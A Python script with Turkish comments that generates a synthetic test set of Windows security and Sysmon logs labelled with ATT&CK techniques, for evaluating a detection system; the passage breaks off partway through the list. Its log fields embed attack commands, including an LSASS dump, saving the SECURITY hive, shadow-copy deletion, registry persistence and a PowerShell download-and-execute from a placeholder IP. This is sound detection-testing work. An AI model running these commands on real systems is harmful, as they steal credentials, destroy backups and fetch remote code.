"""S kolu: ~60 sentetik log. BEKLENTI: docs/beklenti_13_s_kolu.md

YAZILMA ANI KASITLI: G kolu KOSULDUKTAN sonra (beklenti_13 §2.1'in secimi),
ama S'in hat uzerinde HIC calistirilmadigi anda. Beklenen cevaplar ATT&CK
korpusundan ve gercek Windows olay tanimlarindan yazildi; sistemin ne dedigi
BILINMIYOR ve bakilmayacak.

BICIM SINIRI: her log "sistemin anlayacagi" bicimde degil, WINDOWS'un
urettigi bicimde yazildi -- alan adlari ve mesaj govdesi gercek 4656/4663/
4688/4657 kayitlarindan alindi. Bir alani sistemin kolay okumasi icin
eklemek, seti sisteme gore ayarlamaktir.

B1 -- AYIRT EDICI CIFT (baglayici, beklenti §2):
    Ayni kritik anahtara giden iki log; biri 4656 (yazma biti tasiyan
    maskeyle TALEP), digeri 4663/4657 (GERCEKLESEN yazma). Beklenen
    kararlari FARKLI. Cift TEK DEGISKENLI: anahtar, aktor, surec, maske
    ayni; yalnizca olay ID ve onun getirdigi anlam degisir. UC ayri kritik
    anahtarda tekrarlanir -- tek anahtardaki fark o anahtarin kazasi
    olabilir.

    B1 ancak Gorev 15 maskeyi toplu yolda geri getirdigi icin OLCULEBILIR
    (sonuc_13 §6'nin eski kaydi gecersiz). Yontem maddesi 16.

DOZ SINIRI (beklenti §4): `4656` + yazma maskesi + kritik anahtar ucluSU
bu sette YALNIZCA B1'in A yarilarinda, 3 kayitta gecer. Serbest birakilsa
S'in yanlis alarm orani sistemi degil, Gorev 16'da teshis edilmis TEK
kusurun sikligini olcerdi.

    .venv/Scripts/python.exe scripts/build_s_arm_set.py

Cikti: evaluation/s_arm_set.json
Sinama: .venv/Scripts/python.exe scripts/measure_heldout_baseline.py \
            --set evaluation/s_arm_set.json
"""

from __future__ import annotations

import collections
import json
import pathlib
import sys

KOK = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(KOK))

from app.validation.validator import AttackKnowledgeBase  # noqa: E402

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CIKTI = KOK / "evaluation" / "s_arm_set.json"

INSUFFICIENT = "INSUFFICIENT_DATA"
BENIGN = "SUFFICIENT_BENIGN"
SUSPICIOUS = "SUFFICIENT_SUSPICIOUS"

# Gercek 4656/4663 govdesindeki maske: READ_CONTROL + Query + Set key value
# + Create sub-key + Enumerate + Notify. Yazma biti (Set key value) BURADA.
YAZMA_MASKESI = "0x2001F"


def _4656(anahtar: str, hesap: str, surec: str) -> str:
    """Handle TALEBI. Windows govdesi -- Accesses listesi ISTENEN haklardir."""
    return (
        "A handle to an object was requested.  Subject:  Security ID:  "
        f"NT AUTHORITY\\SYSTEM  Account Name:  {hesap}  Account Domain:  "
        "WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  "
        f"Object Type:  Key  Object Name:  {anahtar}  Handle ID:  0x2f4  "
        f"Process Information:  Process ID:  0x2b8  Process Name:  {surec}  "
        f"Access Request Information:  Transaction ID:  {{00000000-0000-0000-0000-000000000000}}  "
        f"Accesses:  READ_CONTROL  Query key value  Set key value  "
        f"Create sub-key  Enumerate sub-keys  Notify about changes to keys  "
        f"Access Reasons:  -  Access Mask:  {YAZMA_MASKESI}  "
        "Privileges Used for Access Check:  -"
    )


def _4663(anahtar: str, hesap: str, surec: str) -> str:
    """GERCEKLESEN erisim. Ayni maske, ama burada kullanilmis haktir."""
    return (
        "An attempt was made to access an object.  Subject:  Security ID:  "
        f"NT AUTHORITY\\SYSTEM  Account Name:  {hesap}  Account Domain:  "
        "WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  "
        f"Object Type:  Key  Object Name:  {anahtar}  Handle ID:  0x2f4  "
        f"Process Information:  Process ID:  0x2b8  Process Name:  {surec}  "
        f"Access Request Information:  Accesses:  Set key value  "
        f"Access Mask:  {YAZMA_MASKESI}"
    )


def _4657(anahtar: str, deger: str, eski: str, yeni: str, surec: str,
          hesap: str = "WINHOST-01$") -> str:
    """`hesap` VARSAYILAN DEGIL, SOZLESME: actor_baseline bastirmasi surec VE
    hesap eslesmesi ister (`hesaplar: [system, nt authority\\system,
    localsystem]`). EK-2'nin beklenen cifti makine hesabiyla yazilirsa
    bastirma tetiklenmez ve beklenti, olculen seyle ILGISIZ bir sebepten
    tutmaz -- 'yanlis sebeple yanlis cevap'. Gercek TrustedInstaller/msiexec
    servis yazmalari zaten SYSTEM olarak gorunur."""
    return (
        "A registry value was modified.  Subject:  Security ID:  "
        f"NT AUTHORITY\\SYSTEM  Account Name:  {hesap}  Account Domain:  "
        "WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  "
        f"{anahtar}  Object Value Name:  {deger}  Handle ID:  0x3c8  "
        "Operation Type:  Existing registry value modified  Process "
        f"Information:  Process ID:  0x2b8  Process Name:  {surec}  Change "
        f"Information:  Old Value Type:  REG_DWORD  Old Value:  {eski}  "
        f"New Value Type:  REG_DWORD  New Value:  {yeni}"
    )


def _4688(hesap: str, surec: str, ust: str, komut: str) -> str:
    return (
        "A new process has been created.  Creator Subject:  Security ID:  "
        f"WINHOST-01\\{hesap}  Account Name:  {hesap}  Account Domain:  "
        "WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process "
        f"ID:  0x1a2c  New Process Name:  {surec}  Token Elevation Type:  "
        "%%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  "
        f"Creator Process ID:  0x8f4  Creator Process Name:  {ust}  "
        f"Process Command Line:  {komut}"
    )


def _zarf(sira: int, event_id: str, govde: str) -> str:
    """Toplayici ZARFI -- gercek QRadar satirlarinin tasidigi bicim.

    Ham Windows mesaj govdesi olay ID'sini TASIMAZ; ID kaydin ust verisinde
    durur ve toplayici onu `EventID=` alanina cikarir (bkz. G kolunun
    `input` alanlari, evaluation/g_arm_qradar_labels.json). Govdeyi zarfsiz
    yazmak seti "daha ham" yapmaz, YANLIS yapar: uretimde hicbir kayit oyle
    gorunmez.

    Bu, seti sisteme gore ayarlamak DEGILDIR -- tam tersi, uretimin girdiyi
    hangi bicimde urettigini sormanin karsiligidir (yontem maddesi 7).
    """
    dakika, saniye = divmod(sira * 37, 60)
    return (
        f'Timestamp="2026-08-31 09:{14 + dakika:02d}:{saniye:02d}" '
        f'EventID={event_id} Hostname=WINHOST-01 Message="{govde}"'
    )


SAM = "\\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account"
SECRETS = "\\REGISTRY\\MACHINE\\SECURITY\\Policy\\Secrets"
LSA = "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa"

LOGLAR: list[dict] = []


# --- BLOK 1: B1 ayirt edici ciftler (6) ----------------------------------
# Her cift TEK DEGISKENLI. A yarisi TALEP, B yarisi GERCEKLESEN erisim.
# Beklenen kararlar FARKLI olmak ZORUNDA -- ayni cikmasi beklenen bir cift
# ayirt etme gucunu olcemez.

for _n, (_anahtar, _ad, _teknik, _kaynak) in enumerate(
    [
        (SAM, "SAM\\Domains\\Account", "T1003.002",
         "T1003.002 OS Credential Dumping: Security Account Manager (v19.1)"),
        (SECRETS, "SECURITY\\Policy\\Secrets", "T1003.004",
         "T1003.004 OS Credential Dumping: LSA Secrets (v19.1)"),
        (LSA, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "T1003.001",
         "T1003.001 OS Credential Dumping: LSASS Memory (v19.1); "
         "Lsa anahtari LSA korumasinin (RunAsPPL) yapilandirmasidir"),
    ],
    start=1,
):
    LOGLAR.append({
        "id": f"S-B1-{_n}A",
        "event_id": "4656",
        "input": _4656(_anahtar, "svc-inventory", "C:\\Windows\\System32\\svchost.exe"),
        "expected_attack_ids": [],
        "expected_decision": INSUFFICIENT,
        "negative_case": True,
        "review_flag": True,
        "b1_pair": f"P{_n}",
        "b1_half": "A",
        "rationale": (
            f"4656 = handle TALEBI. Maske ({YAZMA_MASKESI}) yazma biti tasiyor ama "
            "4656'da maske ISTENEN haktir, kullanilmis hak degil; gerceklesen "
            f"erisim 4663'tur. Anahtar kritik ({_ad}) ama TALEP tek basina "
            "erisim kaniti degildir. Bu satir 'incelenmeli' olur, alarm olmaz."
        ),
        "attack_source": (
            "Windows 4656 tanimi: 'A handle to an object was requested' -- "
            "config/event_semantics.yaml, Gorev 3'te yazilan not"
        ),
    })
    LOGLAR.append({
        "id": f"S-B1-{_n}B",
        "event_id": "4663",
        "input": _4663(_anahtar, "svc-inventory", "C:\\Windows\\System32\\svchost.exe"),
        "expected_attack_ids": [_teknik],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": False,
        "b1_pair": f"P{_n}",
        "b1_half": "B",
        "rationale": (
            f"4663 = GERCEKLESEN erisim, ve kullanilan hak 'Set key value'. "
            f"Kritik anahtara ({_ad}) yazma gerceklesti. Ciftin A yarisiyla "
            "TEK farki olay ID ve onun getirdigi anlam; anahtar, aktor, surec "
            "ve maske ayni."
        ),
        "attack_source": _kaynak,
    })


# --- BLOK 2: Yol A tetikleyenler (14) ------------------------------------
# Teknik + dogrulanmis kanit. G kolunda Yol A HIC atesLENMEDI.

LOGLAR += [
    {
        "id": "S-A-01", "event_id": "4688",
        "input": _4688("jdoe", "C:\\Windows\\System32\\reg.exe",
                       "C:\\Windows\\System32\\cmd.exe",
                       "reg.exe save HKLM\\SECURITY C:\\Users\\Public\\sec.hive"),
        "expected_attack_ids": ["T1003.004"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "SECURITY kovani diske kaydediliyor; hedef herkesin okudugu konum. "
                     "Komut satiri olayin artefaktidir, duzyazi iddiasi degil.",
        "attack_source": "T1003.004 LSA Secrets (v19.1)",
    },
    {
        "id": "S-A-02", "event_id": "4688",
        "input": _4688("jdoe", "C:\\Windows\\System32\\vssadmin.exe",
                       "C:\\Windows\\System32\\cmd.exe",
                       "vssadmin.exe delete shadows /all /quiet"),
        "expected_attack_ids": ["T1490"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Golge kopyalarin sessizce silinmesi kurtarmayi engeller; "
                     "fidye zincirinin standart adimi.",
        "attack_source": "T1490 Inhibit System Recovery (v19.1)",
    },
    {
        "id": "S-A-03", "event_id": "4688",
        "input": _4688("jdoe", "C:\\Windows\\System32\\wbem\\WMIC.exe",
                       "C:\\Windows\\System32\\cmd.exe",
                       "wmic.exe shadowcopy delete"),
        "expected_attack_ids": ["T1490"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Ayni amac, farkli ikili -- tespitin arac adina degil eyleme "
                     "bagli olmasi gerektigini olcer.",
        "attack_source": "T1490 Inhibit System Recovery (v19.1)",
    },
    {
        "id": "S-A-04", "event_id": "4688",
        "input": _4688("jdoe", "C:\\Windows\\System32\\rundll32.exe",
                       "C:\\Windows\\System32\\cmd.exe",
                       "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "
                       "684 C:\\Users\\Public\\out.dmp full"),
        "expected_attack_ids": ["T1003.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "comsvcs.dll MiniDump ile LSASS bellek dokumu; imzali ikili "
                     "uzerinden yasayan-topraktan teknik.",
        "attack_source": "T1003.001 LSASS Memory (v19.1)",
    },
    {
        "id": "S-A-05", "event_id": "4104",
        "input": ("Creating Scriptblock text (1 of 1):  "
                  "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')  "
                  "ScriptBlock ID: 8f2c1b90-0d1a-4a77-9b2e-5c4d3e2f1a09  Path:"),
        "expected_attack_ids": ["T1059.001", "T1105"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Uzaktan indirilen kodun bellekte calistirilmasi. Script blok "
                     "metni gercek kanittir -- iddia degil.",
        "attack_source": "T1059.001 PowerShell + T1105 Ingress Tool Transfer (v19.1)",
    },
    {
        "id": "S-A-06", "event_id": "7045",
        "input": ("A service was installed in the system.  Service Name:  UpdaterSvc  "
                  "Service File Name:  C:\\Users\\Public\\updater.exe  Service Type:  "
                  "user mode service  Service Start Type:  auto start  Service Account:  "
                  "LocalSystem"),
        "expected_attack_ids": ["T1543.003"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Servis ikilisi C:\\Users\\Public'te ve otomatik basliyor; "
                     "mesru servisler bu konumdan calismaz.",
        "attack_source": "T1543.003 Create or Modify System Process: Windows Service (v19.1)",
    },
    {
        "id": "S-A-07", "event_id": "4697",
        "input": ("A service was installed in the system.  Subject:  Security ID:  "
                  "NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Service Information:  "
                  "Service Name:  PSEXESVC  Service File Name:  "
                  "C:\\Windows\\PSEXESVC.exe  Service Type:  0x10  Service Start Type:  3  "
                  "Service Account:  LocalSystem"),
        "expected_attack_ids": ["T1569.002"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "PSEXESVC uzaktan komut yurutmenin imzasidir; 4697 guvenlik "
                     "gunlugu tarafindaki servis kurulum kaydi.",
        "attack_source": "T1569.002 System Services: Service Execution (v19.1)",
    },
    {
        "id": "S-A-08", "event_id": "4698",
        "input": ("A scheduled task was created.  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe  Account Name:  jdoe  Task Name:  \\Updater  "
                  "Task Content:  <Task><Triggers><LogonTrigger/></Triggers><Actions>"
                  "<Exec><Command>C:\\Users\\Public\\u.exe</Command></Exec></Actions></Task>"),
        "expected_attack_ids": ["T1053.005"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Oturum acmada tetiklenen gorev, kullanici yazilabilir konumdaki "
                     "ikiliyi calistiriyor -- kalicilik.",
        "attack_source": "T1053.005 Scheduled Task/Job: Scheduled Task (v19.1)",
    },
    {
        "id": "S-A-09", "event_id": "4702",
        "input": ("A scheduled task was updated.  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe  Account Name:  jdoe  Task Name:  \\Microsoft\\Windows"
                  "\\Defrag\\ScheduledDefrag  Task Content:  <Task><Actions><Exec>"
                  "<Command>powershell.exe</Command><Arguments>-w hidden -enc "
                  "SQBFAFgA</Arguments></Exec></Actions></Task>"),
        "expected_attack_ids": ["T1053.005"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "MEVCUT bir Windows gorevinin icerigi degistirilmis -- yeni gorev "
                     "olusturmaktan daha sinsi; gizli+kodlanmis PowerShell.",
        "attack_source": "T1053.005 Scheduled Task (v19.1)",
    },
    {
        "id": "S-A-10", "event_id": "1102",
        "input": ("The audit log was cleared.  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe  Account Name:  jdoe  Domain Name:  WINHOST-01  "
                  "Logon ID:  0x8C112"),
        "expected_attack_ids": ["T1685.005"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Denetim gunlugunun temizlenmesi izlerin silinmesidir ve rutin "
                     "yonetim isi degildir.",
        "attack_source": "T1685.005 Clear Windows Event Logs (v19.1; T1070.001 REVOKED)",
    },
    {
        "id": "S-A-11", "event_id": "104",
        "input": ("The System log file was cleared.  User:  WINHOST-01\\jdoe  "
                  "Channel:  System"),
        "expected_attack_ids": ["T1685.005"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "1102'nin System kanali karsiligi; ayni teknigin farkli olay "
                     "ID'siyle gorunmesi.",
        "attack_source": "T1685.005 Clear Windows Event Logs (v19.1; T1070.001 REVOKED)",
    },
    {
        "id": "S-A-12", "event_id": "1",
        "input": ("Process Create:  RuleName: -  UtcTime: 2026-08-31 09:14:02.113  "
                  "ProcessId: 7712  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
                  "\\powershell.exe  CommandLine: powershell.exe -nop -w hidden -enc "
                  "JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA  "
                  "User: WINHOST-01\\jdoe  ParentImage: C:\\Program Files\\Microsoft "
                  "Office\\root\\Office16\\WINWORD.EXE"),
        "expected_attack_ids": ["T1059.001", "T1027"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Word'un cocugu olarak gizli+kodlanmis PowerShell -- ust surec "
                     "iliskisi kanitin parcasi.",
        "attack_source": "T1059.001 PowerShell + T1027 Obfuscated Files or Information (v19.1)",
    },
    {
        "id": "S-A-13", "event_id": "11",
        "input": ("File created:  RuleName: -  UtcTime: 2026-08-31 09:15:44.002  "
                  "ProcessId: 7712  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
                  "\\powershell.exe  TargetFilename: C:\\Users\\jdoe\\AppData\\Roaming"
                  "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs"),
        "expected_attack_ids": ["T1547.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Baslangic klasorune dosya birakma -- registry'ye dokunmayan "
                     "kalicilik yolu.",
        "attack_source": "T1547.001 Registry Run Keys / Startup Folder (v19.1)",
    },
    {
        "id": "S-A-14", "event_id": "8",
        "input": ("CreateRemoteThread detected:  RuleName: -  UtcTime: 2026-08-31 "
                  "09:16:10.551  SourceProcessId: 7712  SourceImage: C:\\Users\\Public"
                  "\\u.exe  TargetProcessId: 684  TargetImage: C:\\Windows\\System32"
                  "\\lsass.exe  StartAddress: 0x00007FFB1C2A1000"),
        "expected_attack_ids": ["T1055"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "LSASS'a uzaktan is parcacigi enjeksiyonu; hedef surecin kendisi "
                     "kanitin agirligini tasiyor.",
        "attack_source": "T1055 Process Injection (v19.1)",
    },
]


# --- BLOK 3: Yol B tetikleyenler (10) ------------------------------------
# Kritiklik + GERCEKLESEN erisim. G'de Yol B yalnizca kusurlu desende
# atesLENDI (4656 + yazma maskesi). Burada hepsi 4657/4663.

LOGLAR += [
    {
        "id": "S-B-01", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "Updater", "0", "1", "C:\\Users\\Public\\u.exe"),
        "expected_attack_ids": ["T1547.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Run anahtarina yazma gerceklesti (autorun-run / high).",
        "attack_source": "T1547.001 Registry Run Keys (v19.1)",
    },
    {
        "id": "S-B-02", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                       "Shell", "explorer.exe", "explorer.exe, C:\\Users\\Public\\u.exe",
                       "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1547.004"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Winlogon Shell degeri degistirildi; her oturum acmada calisir.",
        "attack_source": "T1547.004 Winlogon Helper DLL (v19.1)",
    },
    {
        "id": "S-B-03", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
                       "\\Image File Execution Options\\sethc.exe",
                       "Debugger", "-", "C:\\Windows\\System32\\cmd.exe",
                       "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1546.012"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "IFEO Debugger ile erisilebilirlik ikilisinin ele gecirilmesi.",
        "attack_source": "T1546.012 Image File Execution Options Injection (v19.1)",
    },
    {
        "id": "S-B-04", "event_id": "4663",
        "input": _4663("\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                       "jdoe", "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1685"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Defender politikasina GERCEKLESEN yazma. defender-policy ailesi "
                     "hicbir aktor icin bastirilmaz (actor_baseline gerekcesi).",
        "attack_source": "T1685 Disable or Modify Tools (v19.1; T1562.001 REVOKED)",
    },
    {
        "id": "S-B-05", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders"
                       "\\WDigest", "UseLogonCredential", "0", "1",
                       "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1112"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "WDigest'in duz metin kimlik bilgisi saklamasini ACAN degisiklik; "
                     "0 -> 1 yonu kanitin kendisi.",
        "attack_source": "T1112 Modify Registry (v19.1)",
    },
    {
        "id": "S-B-06", "event_id": "4663",
        "input": _4663("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
                       "jdoe", "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1543.003"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Servis anahtarina gerceklesen yazma (service / high) ve hedef "
                     "guvenlik servisi.",
        "attack_source": "T1543.003 Windows Service (v19.1)",
    },
    {
        "id": "S-B-07", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                       "AppInit_DLLs", "-", "C:\\Users\\Public\\h.dll",
                       "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1546.010"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "AppInit_DLLs her user32.dll yukleyen surece DLL enjekte eder.",
        "attack_source": "T1546.010 AppInit DLLs (v19.1)",
    },
    {
        "id": "S-B-08", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
                       "\\Winlogon\\Notify\\evil", "DllName", "-",
                       "C:\\Users\\Public\\n.dll", "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1547.004"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Winlogon Notify saglayicisi -- oturum olaylarinda DLL yuklenir.",
        "attack_source": "T1547.004 Winlogon Helper DLL (v19.1)",
    },
    {
        "id": "S-B-09", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                       "DataBasePath", "%SystemRoot%\\System32\\drivers\\etc",
                       "C:\\Users\\Public\\etc", "C:\\Windows\\System32\\reg.exe"),
        "expected_attack_ids": ["T1112"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "hosts dosyasinin konumunu kullanici yazilabilir dizine tasimak.",
        "attack_source": "T1112 Modify Registry (v19.1)",
    },
    {
        "id": "S-B-10", "event_id": "4663",
        "input": _4663("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print"
                       "\\Environments\\Windows x64\\Print Processors\\evil",
                       "jdoe", "C:\\Windows\\System32\\spoolsv.exe"),
        "expected_attack_ids": ["T1547.012"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Yazdirma islemcisi kaydi spooler tarafindan SYSTEM olarak yuklenir.",
        "attack_source": "T1547.012 Print Processors (v19.1)",
    },
]


# --- BLOK 4: EK-2 baseline cifti, IKI YONLU (4) --------------------------
# Ayni aktor, biri BEKLENEN biri BEKLENMEYEN varlik ailesi. Yalniz beklenen
# konursa kor nokta gorulmez; yalniz beklenmeyen konursa yanlis alarm orani
# olculmez.

LOGLAR += [
    {
        "id": "S-EK2-01", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WixSvc",
                       "ImagePath", "-", "C:\\Program Files\\Vendor\\svc.exe",
                       "C:\\Windows\\servicing\\TrustedInstaller.exe", "SYSTEM"),
        "expected_attack_ids": [], "expected_decision": BENIGN,
        "negative_case": True, "review_flag": False,
        "rationale": "BEKLENEN cift: service <- TrustedInstaller/SYSTEM. Yeni servis "
                     "kaydi yazilim kurulumunun normal adimidir; Yol B bastirilmali.",
        "attack_source": "config/actor_baseline.yaml beklenen_ciftler[0]",
    },
    {
        "id": "S-EK2-02", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MsiSvc",
                       "Start", "3", "2", "C:\\Windows\\System32\\msiexec.exe",
                       "SYSTEM"),
        "expected_attack_ids": [], "expected_decision": BENIGN,
        "negative_case": True, "review_flag": False,
        "rationale": "BEKLENEN cift: service <- msiexec/SYSTEM. Kurulum servis baslatma "
                     "turunu degistirir.",
        "attack_source": "config/actor_baseline.yaml beklenen_ciftler[0]",
    },
    {
        "id": "S-EK2-03", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                       "DisableAntiSpyware", "0", "1",
                       "C:\\Windows\\servicing\\TrustedInstaller.exe", "SYSTEM"),
        "expected_attack_ids": ["T1685"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "BEKLENMEYEN cift: AYNI aktor, farkli varlik ailesi. Bastirma "
                     "anahtari (aile, aktor) CIFTIDIR -- aktor tek basina degil. "
                     "Bu satir bastirilirsa kor nokta olusur.",
        "attack_source": "config/actor_baseline.yaml 'defender-policy <- HERHANGI BIR AKTOR' gerekcesi",
    },
    {
        "id": "S-EK2-04", "event_id": "4663",
        "input": _4663(SAM, "SYSTEM", "C:\\Windows\\servicing\\TrustedInstaller.exe"),
        "expected_attack_ids": ["T1003.002"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "BEKLENMEYEN cift: credential-hive <- TrustedInstaller. Kovan "
                     "erisimi icin mesru rutin aktor TANIMLANMADI.",
        "attack_source": "config/actor_baseline.yaml 'credential-hive <- HERHANGI BIR AKTOR' gerekcesi",
    },
]


# --- BLOK 5: olay ID genisligi (14) --------------------------------------
# KRITER >=24/48 icin. G tek registry ailesine sikismisti; burada registry
# DISI aileler zorunlu.

LOGLAR += [
    {
        "id": "S-ID-01", "event_id": "4720",
        "input": ("A user account was created.  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe  Account Name:  jdoe  New Account:  Security ID:  "
                  "WINHOST-01\\svc-helper  Account Name:  svc-helper  Account Domain:  "
                  "WINHOST-01"),
        "expected_attack_ids": ["T1136.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": True,
        "rationale": "Yerel hesap olusturma tek basina kotucul degil; S-ID-02 ile "
                     "birlikte zincir kurar.",
        "attack_source": "T1136.001 Create Account: Local Account (v19.1)",
    },
    {
        "id": "S-ID-02", "event_id": "4732",
        "input": ("A member was added to a security-enabled local group.  Subject:  "
                  "Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Member:  "
                  "Security ID:  WINHOST-01\\svc-helper  Group:  Group Name:  "
                  "Administrators  Group Domain:  Builtin"),
        "expected_attack_ids": ["T1098"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Yeni hesabin yerel Administrators'a eklenmesi -- ayricalik "
                     "yukseltme ve kalicilik.",
        "attack_source": "T1098 Account Manipulation (v19.1)",
    },
    {
        "id": "S-ID-03", "event_id": "4728",
        "input": ("A member was added to a security-enabled global group.  Subject:  "
                  "Security ID:  CORP\\admin  Member:  Security ID:  CORP\\svc-helper  "
                  "Group:  Group Name:  Domain Admins  Group Domain:  CORP"),
        "expected_attack_ids": ["T1098"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Domain Admins uyeligi -- etki alani duzeyinde ayricalik.",
        "attack_source": "T1098 Account Manipulation (v19.1)",
    },
    {
        "id": "S-ID-04", "event_id": "4738",
        "input": ("A user account was changed.  Subject:  Security ID:  CORP\\admin  "
                  "Target Account:  Security ID:  CORP\\svc-helper  Account Name:  "
                  "svc-helper  Changed Attributes:  Password Last Set:  "
                  "2026-08-31T09:20:00Z  User Account Control:  "
                  "Password Not Required - Enabled"),
        "expected_attack_ids": ["T1098"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "'Password Not Required' bayraginin acilmasi hesap guvenligini "
                     "dusuren bir DEGISIKLIKTIR.",
        "attack_source": "T1098 Account Manipulation (v19.1)",
    },
    {
        "id": "S-ID-05", "event_id": "4756",
        "input": ("A member was added to a security-enabled universal group.  Subject:  "
                  "Security ID:  CORP\\admin  Member:  Security ID:  CORP\\svc-helper  "
                  "Group:  Group Name:  Enterprise Admins  Group Domain:  CORP"),
        "expected_attack_ids": ["T1098"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Enterprise Admins -- orman duzeyinde en yuksek ayricalik.",
        "attack_source": "T1098 Account Manipulation (v19.1)",
    },
    {
        "id": "S-ID-06", "event_id": "4769",
        "input": ("A Kerberos service ticket was requested.  Account Information:  "
                  "Account Name:  jdoe@CORP.LOCAL  Service Information:  Service Name:  "
                  "MSSQLSvc/db01.corp.local  Network Information:  Client Address:  "
                  "::ffff:10.0.0.55  Additional Information:  Ticket Options:  0x40810000  "
                  "Ticket Encryption Type:  0x17"),
        "expected_attack_ids": ["T1558.003"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": True,
        "rationale": "RC4 (0x17) sifrelemeli servis bileti talebi kerberoasting'in "
                     "imzasidir; tek basina kesin degil, bu yuzden inceleme bayragi.",
